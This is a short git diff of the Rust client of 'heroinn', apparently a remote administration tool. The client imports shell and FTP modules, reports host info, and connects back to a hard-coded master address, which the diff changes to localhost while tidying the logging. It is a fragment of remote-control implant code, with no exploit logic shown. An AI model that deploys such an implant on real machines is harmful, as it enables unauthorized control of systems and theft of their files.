@@ -2,8 +2,6 @@ use std::{sync::{mpsc::channel, Arc, atomic::AtomicU64, Mutex}, time::Duration, 
 use std::sync::atomic::Ordering::Relaxed;
 use uuid::Uuid;
 use heroinn_util::{protocol::{tcp::{TcpConnection}, Client}, packet::{Message, HostInfo, Heartbeat}, HeroinnClientMsgID, cur_timestamp_secs, HEART_BEAT_TIME, HeroinnServerCommandID, session::{SessionBase, Session, SessionManager}, HeroinnProtocol, close_all_session_in_lock};
-use simple_logger::SimpleLogger;
-use log::LevelFilter;
 use systemstat::{Platform , System, Ipv4Addr};
 use lazy_static::*;
 
@@ -14,7 +12,7 @@ use module::Shell::ShellClient;
 use crate::module::ftp::FtpClient;
 
 lazy_static!{
-    static ref G_MASTER_ADDR : &'static str = "192.168.199.127:8000";
+    static ref G_MASTER_ADDR : &'static str = "127.0.0.1:8000";
     static ref G_MASTER_PROTOCOL : HeroinnProtocol = HeroinnProtocol::TCP;
     static ref G_OUT_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
     static ref G_IN_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
@@ -22,8 +20,8 @@ lazy_static!{
 
 fn main() {
 
-    SimpleLogger::new().with_utc_timestamps().with_utc_timestamps().with_colors(true).init().unwrap();
-	::log::set_max_level(LevelFilter::Debug);
+    simple_logger::SimpleLogger::new().with_threads(true).with_utc_timestamps().with_colors(true).init().unwrap();
+	::log::set_max_level(log::LevelFilter::Debug);
 
     let clientid = Uuid::new_v4().to_string();
 
